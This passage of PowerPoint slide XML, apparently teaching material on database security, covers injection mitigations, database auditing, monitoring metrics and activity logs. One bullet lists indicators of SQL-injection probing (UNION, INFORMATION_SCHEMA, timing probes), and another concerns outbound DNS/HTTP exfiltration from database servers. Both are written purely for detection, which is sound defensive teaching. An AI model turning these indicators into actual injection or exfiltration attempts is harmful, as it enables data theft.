              <a:t>egress filtering or egress policies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Flag unusual repetitive parameter probes (same param, many variants).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Audit, logging &amp; monitoring to collect DB/query logs, detect anomalous patterns (UNION, INFORMATION_SCHEMA, timing probes).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Network segmentation to isolate DBs and control outgoing traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Monitor outbound DNS/HTTP from DB servers </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2113802537"/>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21E16-6CD6-64FF-18F6-875511A2CEB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Database Auditing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20B5834F-BD16-1E9D-05D4-B5585E90C1EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="811161"/>
            <a:ext cx="7704000" cy="3792789"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>What it is?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Database Auditing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> is the process of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>recording, monitoring, and reviewing database activities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> such as user logins, queries executed, and changes made to data or database structure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Creates a chronological "audit trail" of who did what, when, and where.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Primary Purpose</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Accountability:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Link actions to specific users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Security:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Detect threats &amp; suspicious activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Compliance:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> like</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>GDPR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Protect personal data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>General Data Protection Regulation – EU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>HIPAA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Protect healthcare data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Health Insurance Portability and Accountability Act – USA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>PCI-DSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Protect payment card data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Payment Card Industry Data Security Standard – Globa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Forensics:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Investigate incidents and data breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="676358336"/>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71196-4E4D-D7A0-903F-05B8CBF149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722323-1CF9-89D2-1A87-1B21604D26C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Database Auditing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD0C5217-6D69-9C89-CBFD-AF2B78707FD1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>What Do We Audit? (Key Events)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Logins:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> All successful &amp; failed authentication attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Data Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> queries on sensitive tables.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Data Changes:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>INSERT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>UPDATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>DELETE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> operations (log old &amp; new values).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Schema Changes:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>CREATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>ALTER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>DROP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> statements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Permission Changes:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>GRANT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>REVOKE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> commands.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Admin Actions:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Everything done by privileged users (DBAs).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="741726240"/>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7D770-547C-A805-F62E-0E24012C1D29}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Database Monitoring</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5EE07860-2FC8-D0BA-0BEC-85513E7CCD4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>What is it?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>continuous, real-time observation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> of a database system to track its performance, health, and security.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Focuses on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>system metrics</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>live activity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> to ensure optimal operation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Primary Goal: Proactive Management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Performance:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Identify and resolve bottlenecks before users are impacted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Availability:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Ensure the database is always up and responsive.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Health:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Track resource usage to prevent system failures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Security:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Detect active threats and anomalous behavior in real-time.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2889435976"/>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05F33-12D5-401E-107D-1EC95524BE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CF63E6-C597-07A8-49EC-571778F57750}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Database Monitoring</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3877CA20-3C1F-6795-5AF7-06085905A72F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Key Metrics to Monitor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Performance:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Query Response Time (slow queries)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Transactions per Second (TPS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Number of active connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Resource Utilization:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CPU, Memory, and Disk I/O usage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Disk Space capacity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Health &amp; Availability:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Database uptime/status</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Replication lag (if applicable)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Security:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Failed login attempts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Unusual data access volumes or patterns</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2872974777"/>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51F86-CB4E-6A59-D4AC-6942F795FE5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Activity Logs</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28A1B9C1-DEA3-0C7B-7CF2-4C9BDB4B77D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>What Are They?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>chronological, immutable record</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> of every event and operation performed within a database system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The foundational data source for auditing, monitoring, and alerting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why Are They Critical?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Forensics &amp; Investigation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The primary source for investigating security incidents and data breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Accountability:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Links every action to a specific user, application, or system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
